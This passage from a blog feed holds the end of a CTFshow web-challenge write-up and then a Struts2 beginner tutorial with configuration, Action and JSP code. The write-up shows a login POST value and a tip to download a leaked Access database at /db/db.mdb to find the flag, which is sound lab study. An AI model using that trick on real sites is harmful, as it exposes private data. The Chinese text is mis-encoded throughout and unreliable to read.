class="hljs bash">username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04<br></code></pre></td></tr></table></figure><h2 id="WEB-20"><a href="#WEB-20" class="headerlink" title="WEB 20"></a>WEB 20</h2><h3 id="è€ƒç‚¹-æ•°æ®åº“æ¶æ„ä¸‹è½½"><a href="#è€ƒç‚¹-æ•°æ®åº“æ¶æ„ä¸‹è½½" class="headerlink" title="è€ƒç‚¹: æ•°æ®åº“æ¶æ„ä¸‹è½½"></a>è€ƒç‚¹: æ•°æ®åº“æ¶æ„ä¸‹è½½</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šmdbæ–‡ä»¶æ˜¯æ—©æœŸasp+accessæ„æ¶çš„æ•°æ®åº“æ–‡ä»¶ï¼Œæ–‡ä»¶æ³„éœ²ç›¸å½“äºæ•°æ®åº“è¢«è„±è£¤äº†ã€‚</p></blockquote><p>æ—©æœŸasp+accessæ¶æ„çš„æ•°æ®åº“æ–‡ä»¶ä¸ºdb.mdbï¼Œç›´æ¥æŸ¥çœ‹urlè·¯å¾„æ·»åŠ åŠ /db/db.mdbä¸‹è½½æ–‡ä»¶ï¼Œç”¨è®°äº‹æœ¬æ‰“å¼€æœç´¢flagå³å¯ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WEB</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ä¿¡æ¯æ³„éœ²</tag>
      
      <tag>CTFshow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Struts2æ¡†æ¶å…¥é—¨</title>
    <link href="/2021/03/19/Struts2%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/"/>
    <url>/2021/03/19/Struts2%E6%A1%86%E6%9E%B6%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šStruts2æ¡†æ¶å­¦ä¹ ç¬”è®°ï¼ˆä¸€ï¼‰</p> <a id="more"></a><h1 id="Struts2æ¡†æ¶å…¥é—¨"><a href="#Struts2æ¡†æ¶å…¥é—¨" class="headerlink" title="Struts2æ¡†æ¶å…¥é—¨"></a>Struts2æ¡†æ¶å…¥é—¨</h1><h2 id="Struts2ç®€ä»‹"><a href="#Struts2ç®€ä»‹" class="headerlink" title="Struts2ç®€ä»‹"></a>Struts2ç®€ä»‹</h2><blockquote><p>Struts2æ˜¯ä¸€ç§åŸºäºMVCæ¨¡å¼çš„è½»é‡çº§Webæ¡†æ¶ï¼ŒStruts2æ˜¯Struts1çš„ä¸‹ä¸€ä»£äº§å“ï¼Œæ˜¯åœ¨Struts1å’ŒWebWorkæŠ€æœ¯çš„åŸºç¡€ä¸Šè¿›è¡Œåˆå¹¶åçš„å…¨æ–°æ¡†æ¶</p></blockquote><p>struts2æ¡†æ¶å…¶å®æ˜¯å¯¹javaWebè¡¨ç°å±‚çš„MVCä½œäº†ä¼˜åŒ–</p><h2 id="Struts2çš„ä¼˜ç‚¹"><a href="#Struts2çš„ä¼˜ç‚¹" class="headerlink" title="Struts2çš„ä¼˜ç‚¹"></a>Struts2çš„ä¼˜ç‚¹</h2><p>1ã€é¡¹ç›®å¼€æºï¼Œä½¿ç”¨åŠæ‹“å±•æ–¹ä¾¿ï¼Œå¤©ç”Ÿä¼˜åŠ¿ã€‚<br>2ã€æä¾›Exceptionå¤„ç†æœºåˆ¶ã€‚<br>3ã€Resultæ–¹å¼çš„é¡µé¢å¯¼èˆªï¼Œé€šè¿‡Resultæ ‡ç­¾å®ç°é¡µé¢è·³è½¬ã€‚4<br>4ã€é€šè¿‡ç®€å•ã€é›†ä¸­çš„é…ç½®æ¥è°ƒåº¦ä¸šåŠ¡ç±»ï¼Œæ–¹ä¾¿ä¿®æ”¹ã€‚<br>5ã€æä¾›ç®€å•ã€ç»Ÿä¸€çš„è¡¨è¾¾å¼è¯­è¨€æ¥è®¿é—®æ‰€æœ‰å¯ä¾›è®¿é—®çš„æ•°æ®ã€‚<br>6ã€æä¾›æ ‡å‡†ã€å¼ºå¤§çš„éªŒè¯æ¡†æ¶å’Œå›½é™…åŒ–æ¡†æ¶ã€‚<br>7ã€æä¾›å¼ºå¤§çš„ã€å¯ä»¥æœ‰æ•ˆå‡å°‘é¡µé¢ä»£ç çš„æ ‡ç­¾ã€‚<br>8ã€æä¾›è‰¯å¥½çš„Ajaxæ”¯æŒã€‚<br>9ã€æ‹¥æœ‰ç®€å•çš„æ’ä»¶ï¼Œå¯ä»¥æ‰©å±•Struts2æ¡†æ¶ã€‚<br>10ã€æ‹¥æœ‰æ™ºèƒ½çš„é»˜è®¤è®¾ç½®ï¼Œä¸éœ€è¦å¦å¤–è¿›è¡Œç¹ççš„è®¾ç½®ã€‚</p><h2 id="Struts2å…¥é—¨æ¡ˆä¾‹"><a href="#Struts2å…¥é—¨æ¡ˆä¾‹" class="headerlink" title="Struts2å…¥é—¨æ¡ˆä¾‹"></a>Struts2å…¥é—¨æ¡ˆä¾‹</h2><h3 id="ç¬¬ä¸€æ­¥ï¼šä¸‹è½½jaråŒ…"><a href="#ç¬¬ä¸€æ­¥ï¼šä¸‹è½½jaråŒ…" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼šä¸‹è½½jaråŒ…"></a>ç¬¬ä¸€æ­¥ï¼šä¸‹è½½jaråŒ…</h3><p>ä¸‹è½½åœ°å€ï¼š<a href="https://struts.apache.org/">https://struts.apache.org/</a></p><p>é€‰æ‹©struts-2.3.37-all.zip ä¸‹è½½<br><img src="https://img-blog.csdnimg.cn/20210318221037734.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸‹è½½è§£å‹åï¼Œå‡ºç°ä»¥ä¸‹ç•Œé¢,struts-2.3.37çš„ç›®å½•ç»“æ„ï¼š<br><img src="https://img-blog.csdnimg.cn/20210318221245199.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç”±äºstrutsçš„jaråŒ…å¹¶ä¸å…¨éƒ¨éœ€è¦ï¼Œæ‰¾åˆ°appsç›®å½•ä¸‹struts2-blank.war</p><p><img src="https://img-blog.csdnimg.cn/20210318221723429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è§£å‹struts2-blank.warï¼Œå°†ç¤ºä¾‹ç¨‹åºlibç›®å½•ä¸‹çš„jaråŒ…æ·»åŠ åˆ°æˆ‘ä»¬é¡¹ç›®ä¸­å³å¯ï¼Œæ­¤ç‰ˆæœ¬çš„Struts2é¡¹ç›®å¿…éœ€çš„13ä¸ªjaråŒ…ã€‚<br><img src="https://img-blog.csdnimg.cn/20210318221628262.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="ç¬¬äºŒæ­¥ï¼šåˆ›å»ºé¡¹ç›®å¯¼å…¥jaråŒ…"><a href="#ç¬¬äºŒæ­¥ï¼šåˆ›å»ºé¡¹ç›®å¯¼å…¥jaråŒ…" class="headerlink" title="ç¬¬äºŒæ­¥ï¼šåˆ›å»ºé¡¹ç›®å¯¼å…¥jaråŒ…"></a>ç¬¬äºŒæ­¥ï¼šåˆ›å»ºé¡¹ç›®å¯¼å…¥jaråŒ…</h3><p>åˆ›å»ºé¡¹ç›®ï¼Œå°†ä¸Šé¢çš„13ä¸ªjaråŒ…ç²˜è´´åˆ°libä¸­ï¼Œç„¶åbuild pathï¼Œä¼šåœ¨Web App Librariesä¸­çœ‹åˆ°<br><img src="https://img-blog.csdnimg.cn/20210319193907712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="ç¬¬ä¸‰æ­¥ï¼šé…ç½®web-xml"><a href="#ç¬¬ä¸‰æ­¥ï¼šé…ç½®web-xml" class="headerlink" title="ç¬¬ä¸‰æ­¥ï¼šé…ç½®web.xml"></a>ç¬¬ä¸‰æ­¥ï¼šé…ç½®web.xml</h3><p>ç¼–è¾‘webåº”ç”¨çš„web.xmlé…ç½®æ–‡ä»¶ï¼Œé…ç½®struts2çš„æ ¸å¿ƒæ‹¦æˆªå™¨ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> </span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee&quot;</span> </span><br><span class="hljs-tag"> <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/javaee </span></span><br><span class="hljs-tag"><span class="hljs-string"> http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd&quot;</span> </span><br><span class="hljs-tag"> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;WebApp_ID&quot;</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;3.0&quot;</span>&gt;</span><br><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>FirstStruts2<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--é…ç½®Struts2æ ¸å¿ƒè¿‡æ»¤å™¨--&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>org.apache.struts2.dispatcher.ng.filter.StrutsPrepareAndExecuteFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>struts2<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="ç¬¬å››æ­¥ï¼šåˆ›å»ºActionç±»"><a href="#ç¬¬å››æ­¥ï¼šåˆ›å»ºActionç±»" class="headerlink" title="ç¬¬å››æ­¥ï¼šåˆ›å»ºActionç±»"></a>ç¬¬å››æ­¥ï¼šåˆ›å»ºActionç±»</h3><p>ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> cn.itcast.action;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HelloWorldAction</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">execute</span> <span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;success&quot;</span>;<br>    <br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ç¬¬äº”æ­¥ï¼šåˆ›å»ºstruts-xmlæ–‡ä»¶"><a href="#ç¬¬äº”æ­¥ï¼šåˆ›å»ºstruts-xmlæ–‡ä»¶" class="headerlink" title="ç¬¬äº”æ­¥ï¼šåˆ›å»ºstruts.xmlæ–‡ä»¶"></a>ç¬¬äº”æ­¥ï¼šåˆ›å»ºstruts.xmlæ–‡ä»¶</h3><p>å¼•å…¥dtdçº¦æŸï¼Œè¯¥ä»£ç å¯ä»¥åœ¨WebContent\WEB-INF\lib\struts2-core-2.3.37.jaræ‰¾åˆ°<br><img src="https://img-blog.csdnimg.cn/20210319195632426.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>é…ç½®action</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>       <span class="hljs-comment">&lt;!-- é…ç½®Action --&gt;</span><br>       <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.HelloWorldAction&quot;</span>&gt;</span><br>            <span class="hljs-comment">&lt;!-- é…ç½®resultç»“æœé¡µé¢è·³è½¬ --&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>      <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span><br><span class="hljs-comment">&lt;!-- æŒ‡å®šStruts2é…ç½®æ–‡ä»¶çš„D2Tä¿¡æ¯ --&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta"><span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">struts</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- Struts2çš„Actionå¿…é¡»æ”¾åœ¨æŒ‡å®šçš„åŒ…ç©ºé—´ä¸‹å®šä¹‰ --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;hello&quot;</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">extends</span>=<span class="hljs-string">&quot;struts-default&quot;</span>&gt;</span><br>       <br>       <span class="hljs-tag">&lt;<span class="hljs-name">action</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;helloWorld&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;cn.itcast.action.HelloWorldAction&quot;</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;success&quot;</span>&gt;</span>/success.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">result</span>&gt;</span><br>       <span class="hljs-tag">&lt;/<span class="hljs-name">action</span>&gt;</span><br>      <br>    <span class="hljs-tag">&lt;/<span class="hljs-name">package</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">struts</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>è§£å†³Struts2çš„é…ç½®æ–‡ä»¶struts.xmlæ–‡ä»¶æ— æç¤ºé—®é¢˜</strong><br>struts.xmlæ–‡ä»¶æç¤ºæ¥è‡ªDTDçº¦æŸï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">struts</span> <span class="hljs-meta-keyword">PUBLIC</span></span><br><span class="hljs-meta">    <span class="hljs-meta-string">&quot;-//Apache Software Foundation//DTD Struts Configuration 2.3//EN&quot;</span></span><br><span class="hljs-meta">    <span class="hljs-meta-string">&quot;http://struts.apache.org/dtds/struts-2.3.dtd&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ–¹æ³•1ï¼šç”µè„‘å¯ä»¥ä¸Šç½‘ï¼Œä¼šè‡ªåŠ¨è®¿é—®<code>http://struts.apache.org/dtds/struts-2.3.dtd</code>ï¼Œæä¾›æç¤ºåŠŸèƒ½<br>æ–¹æ³•2: é…ç½®æœ¬åœ°DTDæç¤º<br>é¦–å…ˆéœ€è¦æ‰¾åˆ°æˆ‘ä»¬çš„strutsæ ¸å¿ƒjaråŒ…<code>struts2-core-2.3.30.jar</code>ï¼Œç„¶åæˆ‘ä»¬éœ€è¦å°†å®ƒè§£å‹ï¼Œå¯ä»¥çœ‹åˆ°<code>struts-2.3.dtd</code>æ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/2021032319251158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é€‰æ‹©window  â€“&gt; preferences  â€“&gt;  æœç´¢xml  â€“&gt;  é€‰æ‹©xml Catalog<br><img src="https://img-blog.csdnimg.cn/20210323192626738.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><ul><li>  Locationï¼šç‚¹å‡»File Systemï¼Œæ·»åŠ åˆšæ‰è§£å‹ruts2-2.3.dtdæ–‡ä»¶è·¯å¾„ã€‚</li><li>   Key type ï¼šé€‰æ‹©URI</li><li>  keyï¼š<a href="http://struts.apache.org/dtds/struts-2.3.dtd">http://struts.apache.org/dtds/struts-2.3.dtd</a><br><img src="https://img-blog.csdnimg.cn/20210323192722238.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç‚¹å‡»åº”ç”¨ï¼Œé‡æ–°æ‰“å¼€struts.xmlç¼–è¾‘ï¼Œä¼šå¾—åˆ°æç¤º<br><img src="https://img-blog.csdnimg.cn/20210323193147877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li></ul><h3 id="ç¬¬å…­æ­¥ï¼šåˆ›å»ºjspæ–‡ä»¶"><a href="#ç¬¬å…­æ­¥ï¼šåˆ›å»ºjspæ–‡ä»¶" class="headerlink" title="ç¬¬å…­æ­¥ï¼šåˆ›å»ºjspæ–‡ä»¶"></a>ç¬¬å…­æ­¥ï¼šåˆ›å»ºjspæ–‡ä»¶</h3><p>index.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Struts2å…¥é—¨æ¡ˆä¾‹<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Struts2å…¥é—¨æ¡ˆä¾‹<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;$&#123;pageContext.request.contextPath &#125;/helloWorld.action&quot;</span>&gt;</span>Click me!<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>success.jsp</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs html">&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=UTF-8&quot;<br>    pageEncoding=&quot;UTF-8&quot;%&gt;<br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span> <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;</span> <span class="hljs-meta-string">&quot;http://www.w3.org/TR/html4/loose.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Type&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;text/html; charset=UTF-8&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Struts2è·³è½¬é¡µé¢<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Struts2è·³è½¬é¡µé¢æˆåŠŸ<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="ç¬¬ä¸ƒæ­¥ï¼šéƒ¨ç½²é¡¹ç›®"><a href="#ç¬¬ä¸ƒæ­¥ï¼šéƒ¨ç½²é¡¹ç›®" class="headerlink" title="ç¬¬ä¸ƒæ­¥ï¼šéƒ¨ç½²é¡¹ç›®"></a>ç¬¬ä¸ƒæ­¥ï¼šéƒ¨ç½²é¡¹ç›®</h3><p>å‘å¸ƒé¡¹ç›®ï¼Œç‚¹å‡»è¶…é“¾æ¥<br><img src="https://img-blog.csdnimg.cn/20210319201030489.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·³è½¬æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20210319201255433.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" 